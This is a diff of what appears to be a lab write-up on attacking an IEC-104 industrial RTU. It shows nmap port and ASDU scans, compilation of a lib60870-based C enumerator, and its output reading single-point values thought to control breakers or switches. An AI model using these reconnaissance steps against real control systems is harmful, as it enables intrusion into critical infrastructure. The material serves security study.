@@ -64,7 +64,7 @@ So the attack scenario is as follows:
 
 From the breached engineering machine, lets assume that the threat actor has already scanned the OT network and knows the IPs of the RTU and the connected master. The attacker is able to load `nmap` on the machine, and starts recon. First, let's scan all ports to figure out which port on the RTU is running the iec-104 service:
 
-```bash
+```sh
 otuser@a8f0b6ff9c14:~$ nmap -p- -Pn 172.30.0.2
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-04 06:57 UTC
 Nmap scan report for server.ot_net (172.30.0.2)
@@ -84,7 +84,7 @@ Each IEC-104 RTU has something known as an  Application Service Data Unit (ASDU)
 
 `nmap` has a neat script to discover these ASDU addresses, which is called `iec-identify.nse`. Let's utilize this:
 
-```bash
+```sh
 otuser@a8f0b6ff9c14:~$ nmap 172.30.0.2 -Pn -p 2404 --script iec-identify.nse
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-04 07:34 UTC
 Nmap scan report for server.ot_net (172.30.0.2)
@@ -238,7 +238,7 @@ asduHandler(void* parameter, int address, CS101_ASDU asdu)
 
 int main(void)
 {
-    const char* ip = "127.0.0.1";
+    const char* ip = "172.30.0.2";
     int port = 2404;
     int asdu = 65535;
 
@@ -278,24 +278,29 @@ In this script, I have accounted for the most common Information Object types, t
 | `M_ME_NB_1` | 11          | Measured Value, Scaled Integer    | Analog value represented as a scaled integer                    | Prints IOA + integer value                   |
 | `M_ME_NC_1` | 13          | Measured Value, Short Floating Pt | Analog value represented as 32-bit IEEE 754 float               | Prints IOA + float value                     |
 | **default** | —           | Unknown/Other                     | Any unhandled ASDU type                                         | Prints IOA + “Unparsed type”                 |
+The script can be compiled as such:
+```sh
+otuser@a8004a5c456a:~$ gcc enum.c -o enum -I'/opt/lib60870/lib60870-C/src/hal/inc' -L '/opt/lib60870/lib60870-C/build/' /opt/lib60870/lib60870-C/build/src/liblib60870.a
+```
 
 Running the script, we get an output of all the available Information Objects associated with this Application Service Data Unit (ASDU):
 
 ```sh
-[*] Connecting to 127.0.0.1:2404 (ASDU 65535)
+otuser@a8004a5c456a:~$ ./enum
+[*] Connecting to 172.30.0.2:2404 (ASDU 65535)
 [+] Connection established
 [>] Sending general interrogation (C_IC_NA_1)...
 [>] Received ASDU: Type=C_IC_NA_1 (100), Elements=1
     [GI Activation Confirmation]
-[>] Received ASDU: Type=M_ME_NB_1 (11), Elements=3
-    IOA: 1 | Type: M_ME_NB_1 | Value: -32768
-    IOA: 2 | Type: M_ME_NB_1 | Value: 10
-    IOA: 3 | Type: M_ME_NB_1 | Value: -5
+[>] Received ASDU: Type=M_SP_NA_1 (1), Elements=3
+    IOA: 1001 | Type: M_SP_NA_1 | Value: 1
+    IOA: 1002 | Type: M_SP_NA_1 | Value: 1
+    IOA: 1003 | Type: M_SP_NA_1 | Value: 0
 [>] Received ASDU: Type=C_IC_NA_1 (100), Elements=1
     [GI Termination]
 [-] Connection closed
 ```
 
-Corresponding the results with the different types of information object, we can see that the type is `M_ME_NB_1`, which is Measured Value, Scaled Integer. This could indicate that this information object could be measuring tank levels, voltage levels, or something similar.
+Corresponding the results with the different types of information objects, we can see that the type of the three outputted IOAs are `M_SP_NA_1`, which hold Single Point Information storing Boolean data. This could indicate that these information objects could be associated with breakers or switches.
 
 
